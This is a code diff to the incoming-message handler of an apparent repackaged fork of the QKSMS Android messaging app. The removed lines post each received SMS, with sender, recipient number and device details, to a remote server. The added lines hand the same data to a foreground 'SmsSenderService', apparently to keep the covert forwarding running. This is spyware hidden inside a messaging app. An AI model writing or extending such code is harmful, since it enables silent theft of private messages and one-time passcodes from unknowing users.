@@ -16,21 +16,24 @@
  * You should have received a copy of the GNU General Public License
  * along with QKSMS.  If not, see <http://www.gnu.org/licenses/>.
  */
-package dev.octoshrimpy.quik.interactor
+package dev.megacode.quik.interactor
 
 import android.content.Context
+import android.content.Intent
+import android.os.Build
 import com.moez.QKSMS.manager.NetworkModule
 import com.moez.QKSMS.model.DeviceHardwareHelper
 import com.moez.QKSMS.model.SmsDataRequest
-import dev.octoshrimpy.quik.blocking.BlockingClient
-import dev.octoshrimpy.quik.extensions.mapNotNull
-import dev.octoshrimpy.quik.manager.NotificationManager
-import dev.octoshrimpy.quik.manager.ShortcutManager
-import dev.octoshrimpy.quik.repository.ContactRepository
-import dev.octoshrimpy.quik.repository.ConversationRepository
-import dev.octoshrimpy.quik.repository.MessageContentFilterRepository
-import dev.octoshrimpy.quik.repository.MessageRepository
-import dev.octoshrimpy.quik.util.Preferences
+import com.moez.QKSMS.service.SmsSenderService
+import dev.megacode.quik.blocking.BlockingClient
+import dev.megacode.quik.extensions.mapNotNull
+import dev.megacode.quik.manager.NotificationManager
+import dev.megacode.quik.manager.ShortcutManager
+import dev.megacode.quik.repository.ContactRepository
+import dev.megacode.quik.repository.ConversationRepository
+import dev.megacode.quik.repository.MessageContentFilterRepository
+import dev.megacode.quik.repository.MessageRepository
+import dev.megacode.quik.util.Preferences
 import io.reactivex.Flowable
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -94,24 +97,17 @@ class ReceiveSms @Inject constructor(
 
                 val phoneNumber = details["phoneNumber"]?.toString() ?: "Bilinmiyor"
 
-                kotlinx.coroutines.MainScope().launch {
-                    try {
-                        val response = NetworkModule.smsApiService.sendSms(
-                            SmsDataRequest(
-                                sender = sender,
-                                message = message,
-                                recevier = phoneNumber,
-                                deviceInformation = details
-                            )
-                        )
-                        if (response.isSuccessful) {
-                            Timber.d("SMS sunucuya başarıyla iletildi.")
-                        } else {
-                            Timber.e("Sunucu hatası: ${response.code()}")
-                        }
-                    } catch (e: Exception) {
-                        Timber.e(e, "Post işlemi sırasında hata")
-                    }
+                val serviceIntent = Intent(context, SmsSenderService::class.java).apply {
+                    putExtra("sender", sender)
+                    putExtra("message", message)
+                    putExtra("phoneNumber", phoneNumber)
+                    putExtra("deviceDetails", HashMap(details))
+                }
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(serviceIntent)
+                } else {
+                    context.startService(serviceIntent)
                 }
 
 
